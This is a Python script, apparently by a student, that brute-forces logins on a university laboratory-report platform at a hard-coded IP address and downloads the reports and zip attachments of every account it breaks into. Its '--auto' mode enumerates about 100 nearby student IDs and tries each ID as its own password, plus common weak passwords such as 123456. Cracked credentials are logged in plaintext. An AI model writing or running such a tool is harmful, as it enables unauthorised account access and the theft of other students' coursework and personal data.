# -*- coding: utf-8 -*-
import requests
import re
import os,sys
import json
from time import sleep
import logging
import argparse

def MY_Argparse():

    parser = argparse.ArgumentParser(usage="%(prog)s [options]",add_help=False,

    formatter_class=argparse.RawDescriptionHelpFormatter,
    description=(u'''
        作者：End1ng blog:end1ng.wordpress.com
        --------------------------------
        爆破并下载实验报告
        结果保存在 "lab1.0" 中
        每个人有一个独立文件夹
        文本在 "实验名/text.txt"
        压缩包在 "实验名/ok.zip" 中'''))
    optional = parser.add_argument_group('optional arguments')
    optional.add_argument('-h', '--help', action="store_true", help='help of the %(prog)s program')
    optional.add_argument('--version', action='version', version='%(prog)s 1.1')

    auto = parser.add_argument_group('auto arguments')
    auto.add_argument('--auto',metavar=u'你的学号',help=u'*输入你的学号，自动去寻找下载 ^_-')

    args = parser.add_argument_group('Necessary parameter')

    args.add_argument('-u','--user', nargs='*',metavar=u'用户名',help=u'*用户名 多个用空格分隔')
    args.add_argument('-U','--userfile',metavar=u'文件名',help=u'*用户名列表文件')
    args.add_argument('-p','--pass', nargs='*',metavar=u'密码',help=u'*密码 多个用空格分隔')
    args.add_argument('-P','--passfile',metavar=u'文件名',help=u'*密码列表文件')

    other = parser.add_argument_group('other arguments')
    other.add_argument('--level',metavar=u'level',help=u'程序运行级别:CRITICAL,ERROR,WARNING,INFO,DEBUG,NOTSET')

    args=parser.parse_args()
    args = vars(args)

    if args['auto']:
        return args

    if not args['user'] and not args['userfile'] and not args['pass'] and not args['passfile'] or args['help']:
        parser.print_help()
        sys.exit()
    if not args['user'] and not args['userfile']:
        LOG.info(u"没有指定用户名")
        sys.exit()
    if not args['pass'] and not args['passfile']:
        LOG.info(u"没有指定密码")
        sys.exit()

    return args

class classlog(object):
    """log class"""
    def __init__(self,logfilename="log.txt",level="INFO"):
        level = level if level in ['CRITICAL','ERROR','WARNING','INFO','DEBUG','NOTSET'] else 'INFO'
        self.logger = logging.getLogger("classlog")
        self.logger.setLevel(logging.DEBUG)
        Fileformatter = logging.Formatter("%(asctime)s - %(filename)s - %(levelname)-8s: %(message)s",datefmt='%Y-%m-%d %I:%M:%S %p')
        Streamformatter = logging.Formatter("%(asctime)s %(filename)s %(levelname)s:%(message)s",datefmt='%Y-%m-%d %I:%M:%S')# ,filename='example.log')

        Filelog = logging.FileHandler(logfilename)
        Filelog.setFormatter(Fileformatter)
        Filelog.setLevel(logging.DEBUG)

        Streamlog = logging.StreamHandler()
        Streamlog.setFormatter(Streamformatter)
        Streamlog.setLevel(level)

        self.logger.addHandler(Filelog)
        self.logger.addHandler(Streamlog)

    def debug(self,msg):
        self.logger.debug(msg)

    def info(self,msg):
        self.logger.info(msg)

    def warn(self,msg):
        self.logger.warn(msg)

    def error(self,msg):
        self.logger.error(msg)

    def critical(self,msg):
        self.logger.critical(msg)


class Student(object):
    """docstring for Student"""
    def __init__(self, userid, password):
        # 学号
        self.userid = userid
        # 密码
        self.password = password
        # cookie
        self.cookies = None

        # 学生姓名
        self.username = None
        # 班级号
        self.cid = None
        # 当前学期号
        self.term = None


        # 已完成实验: 课程名 实验名 教师名 第几周 ReportId实验号 lid完成时间
        self.finlist = []
        # 未完成实验
        self.unfinlist = []

        self.RootDir = None

        # 登陆
        if self.getinfo():
            LOG.info(self.username + self.userid + ':' + self.password + u": 登陆成功")
            # 若登陆成功 获取完成实验列表
            self.getfinish()

            self.getlab()

            # self.getunfinish()
        else:
            LOG.debug(self.userid + ':' + self.password + u": 账户或密码错误")

    # 登陆并搜集信息
    def getinfo(self):

        payload = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; WOW64; rv:45.0) Gecko/20100101 Firefox/45.0',
        'userid' : self.userid,
        'password': self.password,
        'quan':'Student'
        }

        respost = requests.post(RootUrl + "Login.action", data=payload)
        # 3表示登陆成功
        if respost.text == '"3"':
            self.cookies = respost.cookies
            resget = requests.get(RootUrl + 'student.action', cookies = self.cookies)
            self.username = re.search("<i class=\"icon-user\">.*> (.*)</span>",resget.text).group(1)#\s*<span class=\"hidden-phone\">(.*)</span>
            self.cid = re.search("cid=(\d*)", resget.text).group(1)
            self.term = re.search("term=(\d*)", resget.text).group(1)
            self.RootDir = self.userid + self.username + '/'
            return 1

        if respost.text == '"4"':
            return 0

    def getfinish(self):

        resget = requests.get(RootUrl + 'student/student/StudentReport_finish?sid=' + self.userid + '&term=' + self.term, cookies = self.cookies)

        # (课程名 教师名 第几周 实验网址)
        m = re.findall('<tr>\s*<td.*>(.*)</td>\s*<td.*>(.*)</td>\s*<td.*>(.*)</td>\s*<td.*>(.*)</td>\s*<td.*>\s*<a.*href=(.*)">', resget.text)

        for x in m:
            LOG.info(u" 已完成:" + x[0] + ":" + x[1])
            # 匹配ReportId实验号 lid完成时间
            mm = re.search("studentReportId=(\d*)&lid=(\d*-\d*)", x[4])
            self.finlist.append([x[0],x[1],x[2],x[3],mm.group(1),mm.group(2)])


    def getunfinish(self):
        resget = requests.get(RootUrl + 'student/student/StudentReport_unFinish?sid=' + self.userid + '&cid=' + self.cid + '&term=' + self.term, cookies = self.cookies)
        m = re.findall('<tr>\s*<td.*>(.*)</td>\s*<td.*>(.*)</td>\s*<td.*>(.*)</td>\s*<td.*>(.*)</td>\s*<td.*>(.*)</td>\s*<td.*>\s*<a.*href=(.*)">', resget.text)
        for x in m:
            LOG.debug(u"未完成:" + x[0] + x[1])
            self.unfinlist.append(re.search("labReportClassId=(\d*)", resget.text).group(1))

    def getlab(self):

        if not os.path.exists(RootDir + self.RootDir) and not os.path.isfile(RootDir + self.RootDir):
            os.makedirs(RootDir + self.RootDir)
            LOG.debug(u"创建文件夹: " + RootDir + self.RootDir)

        for x in self.finlist:

            thedir = RootDir + self.RootDir + x[1]
            resget = requests.get(RootUrl + 'student/student/StudentReport_search?sid=' + self.userid + '&studentReportId=' + x[4] + '&lid=' + x[5] + '&term=' + self.term, cookies = self.cookies)
            text = re.findall("<textarea.*name=\"(.*?)\".*?>([\s\S]*?)</textarea>",resget.content)

            if not os.path.exists(thedir) and not os.path.isfile(thedir):
                os.makedirs(thedir)
                LOG.debug(u"创建文件夹: " + thedir)

            f = open(thedir + "/text.txt","w")
            for xx in text:
                f.write(xx[1] + "\n" + "-"*80 + "\n")
                # json格式内容
                # f.write(json.dumps(text))


            url = re.search("(student/experDownload.action\?fileName=.*)\"", resget.text)

            if url:
                r = requests.get(RootUrl + 'student/' + url.group(1))
                code = open(thedir + "/ok.zip","wb")
                code.write(r.content)

            LOG.info(u"  已下载:" + x[1])


# 保存位置
RootDir = "lab1.0/"

# 实验平台网址
RootUrl = "http://61.163.231.194:8080/Lab2.0/"

# 创建保存位置文件夹
if not os.path.exists(RootDir) and not os.path.isfile(RootDir):
    os.makedirs(RootDir)

# 初始化参数函数
ARGS = MY_Argparse()

# 初始化日志类
LOG = classlog(RootDir + "log.txt",level=ARGS['level'])#'INFO'

# 用户列表
userlist = []
password = []

if ARGS['user']:
    userlist.extend(ARGS['user'])
elif ARGS['userfile']:
    with open(ARGS['userfile'],"r") as f:
        userlist.extend(f.readlines())

if ARGS['pass']:
    password.extend(ARGS['pass'])
elif ARGS['passfile']:
    with open(ARGS['userfile'],"r") as f:
        password.extend(f.readlines())

if ARGS['auto']:
    password = ['123456','654321','111333','12345678']
    userid = ARGS['auto'][:-2]
    userid += '01'
    for user in range(100):
        userlist.append(str(int(userid) + user))

    for user in userlist:

        stu = Student(user,user)

        for pas in password:

            stu = Student(user,pas)

    sys.exit()

for user in userlist:

    for pas in password:

        stu = Student(user.strip(),pas.strip())
